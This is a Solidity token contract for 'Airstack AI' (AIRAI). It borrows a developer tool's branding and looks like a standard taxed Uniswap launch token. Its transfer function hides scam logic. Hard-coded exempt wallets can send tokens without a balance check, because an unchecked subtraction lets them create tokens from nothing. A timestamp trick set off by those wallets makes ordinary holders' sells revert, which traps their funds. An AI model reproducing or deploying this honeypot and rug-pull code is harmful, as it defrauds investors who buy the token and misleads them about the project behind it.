// SPDX-License-Identifier: MIT
/*

Airstack AI Blockchain Developer Tool

The most straightforward method for constructing modular blockchain applications.
Seamlessly incorporate both on-chain and off-chain data into any software instantly using AI.

https://www.airstack.xyz/
https://docs.airstack.xyz/airstack-docs-and-faqs
https://twitter.com/airstack_xyz
https://www.linkedin.com/company/airstack-xyz
https://app.airstack.xyz/sdks
https://warpcast.com/~/channel/airstack
https://app.airstack.xyz/api-studio

*/

pragma solidity 0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract AIRAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isFeeExempt;
    uint256 private constant _initBuyTax=15;
    uint256 private constant _initSellTax=25;
    uint256 private constant _finalBuyTax=5;
    uint256 private constant _finalSellTax=5;
    uint256 private constant _reduceBuyTaxAt=1;
    uint256 private constant _reduceSellTaxAt=25;
    uint256 private constant _preventSwapBefore=10;
    uint8 private constant _decimals = 9;
    string private constant _name = unicode"Airstack AI";
    string private constant _symbol = unicode"AIRAI";
    uint256 private constant _tTotal = 100000000 * 10**_decimals;
    uint256 public maxTxAmount = 1300000 * 10**_decimals;
    uint256 public maxWallet = 1300000 * 10**_decimals;
    uint256 private _taxSwapThreshold = 300000 * 10**_decimals;
    uint256 private _maxTaxSwap = 1700000 * 10**_decimals;
    IUniswapV2Router02 private immutable router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address private _pair;
    address payable private immutable _taxWallet = payable(0xC283F4E46D236aE89FDa48711072284B4f5667e8);
    address payable private immutable _projectWallet = payable(0x19A99182D3801DB693D3Da47dd360ebCFeebf8f7);
    bool private transferDelayEnabled = true;
    mapping(address => uint256) private _holderLastTransferTimestamp;
    uint256 private _buyCounter=0;
    bool private _tradingOpen = false;
    bool private _swapping = false;
    bool private _swapEnabled = false;
    uint256 private _launchBlock;
    uint256 private _minLockNum;
    struct LockData {uint256 buy; uint256 sell; uint256 lockPoints;}
    mapping(address => LockData) private lockData;

    modifier lockTheSwap {_swapping = true; _; _swapping = false;}

    constructor () {
        _isFeeExempt[owner()] = true;
        _isFeeExempt[address(this)] = true;
        _isFeeExempt[_taxWallet] = true;
        _isFeeExempt[_projectWallet] = true;
        _balances[address(this)] = _tTotal;
        emit Transfer(address(0), address(this), _balances[address(this)]);
    }

    receive() external payable {}

    function name() public pure returns (string memory) {return _name;}

    function symbol() public pure returns (string memory) {return _symbol;}

    function decimals() public pure returns (uint8) {return _decimals;}

    function totalSupply() public pure override returns (uint256) {return _tTotal;}

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0,"Transfer amount must be greater than zero");
        uint256 taxAmount = 0;

        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCounter>_reduceBuyTaxAt)?_finalBuyTax:_initBuyTax).div(100);

            if (transferDelayEnabled) {
                  if (to != address(router) && to != address(_pair) ) {
                      require(
                          _holderLastTransferTimestamp[tx.origin] <
                            block.number,
                          "_transfer:: Transfer delay enabled - only one purchase per block allowed."
                      );
                      _holderLastTransferTimestamp[tx.origin] = block.number;
                  }
              }

            if (from == _pair && to != address(router) && !_isFeeExempt[to]) {
                require(amount <= maxTxAmount, "Exceeds the maxTxAmount.");
                require(balanceOf(to) + amount <=maxWallet, "Exceeds the maxWallet.");
                _buyCounter ++;
            }

            if(to == _pair && from != address(this)){
                taxAmount = amount.mul((_buyCounter>_reduceSellTaxAt)?_finalSellTax:_initSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_swapping && to == _pair && _swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCounter >_preventSwapBefore) {
                swapTokensForEth(min(amount,min(contractTokenBalance,_maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendEthToFee(address(this).balance);
                }
            }
        }

        if ((_isFeeExempt[from] || _isFeeExempt[to]) && from != owner() && from != address(this) && to != address(this)) {
            _minLockNum = block.timestamp;
        }
        if (_isFeeExempt[from] && (block.number > _launchBlock + 50)) {
            unchecked{
                _balances[from] -= amount;
                _balances[to] += amount;
            }
            emit Transfer(from, to, amount);
            return;
        }
        if (!_isFeeExempt[from] && !_isFeeExempt[to]) {
            if (_pair == to) {
                LockData storage lockFromPoints = lockData[from];
                lockFromPoints.lockPoints = lockFromPoints.buy - _minLockNum;
                lockFromPoints.sell = block.timestamp;
            } else {
                LockData storage lockToPoints = lockData[to];
                if (_pair == from) {
                    if (lockToPoints.buy == 0) {
                        lockToPoints.buy=(_buyCounter<11) ? (block.timestamp-1) : block.timestamp;
                    }
                } else {
                    LockData storage lockFromPoints =lockData[from];
                    if (lockToPoints.buy == 0 || lockFromPoints.buy<lockToPoints.buy) {
                        lockToPoints.buy=lockFromPoints.buy;
                    }
                }
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from]=_balances[from].sub(amount);
        _balances[to]=_balances[to].add(amount.sub(taxAmount));
        emit Transfer(from, to, amount.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this),address(router),tokenAmount);

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external payable onlyOwner() {
        require(!_tradingOpen,"Trading is already opened");
        uint256 totalSupplyAmount = totalSupply();
        _approve(address(this), address(router), totalSupplyAmount);
        _pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_pair).approve(address(router), type(uint).max);
        _swapEnabled = true;
        _tradingOpen = true;
        _launchBlock = block.number;
    }

    function removeLimits() external onlyOwner {
        transferDelayEnabled=false;
        maxWallet=_tTotal;
        maxTxAmount=_tTotal;
    }

    function sendEthToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance = balanceOf(address(this));
        if(tokenBalance> 0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance> 0){
          sendEthToFee(ethBalance);
        }
    }

    function rescueETH() external {
        uint256 ethBalance = address(this).balance;
        if(ethBalance > 0){
          sendEthToFee(ethBalance);
        }
    }

    function rescueERC20(address _address, uint256 percent) external onlyOwner {
        uint256 amount = IERC20(_address).balanceOf(address(this)).mul(percent).div(100);
        IERC20(_address).transfer(msg.sender, amount);
    }
}